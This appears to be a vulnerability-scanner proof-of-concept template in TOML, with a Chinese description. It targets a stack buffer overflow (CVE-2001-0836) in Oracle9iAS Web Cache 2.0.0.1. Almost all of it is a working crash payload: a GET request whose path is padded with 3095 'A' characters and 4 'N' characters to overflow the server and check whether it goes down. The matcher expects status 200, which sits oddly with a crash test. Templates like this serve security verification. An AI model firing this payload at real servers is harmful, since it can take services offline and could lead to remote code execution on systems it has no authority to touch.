[info]
author = "ave"
description = "Oracle9iAS Web Cache 2.0.0.1 在处理超长 HTTP GET 请求 URL 路径时存在栈缓冲区溢出漏洞，发送超长 URL 可导致服务崩溃（DoS）或潜在远程代码执行。PoC 通过发送超长 GET 请求路径验证服务是否崩溃。"
id = "POC-AVE-2001-0384"
name = "Oracle9iAS Web Cache 2.0.0.1 缓冲区溢出漏洞 PoC"
severity = "high"
tags = ["ave-2001-0384"]
vuln_id = [
    "CVE-2001-0836",
    "AVE-2001-0384",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{crap(3095,'A')}}{{crap(4,'N')}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
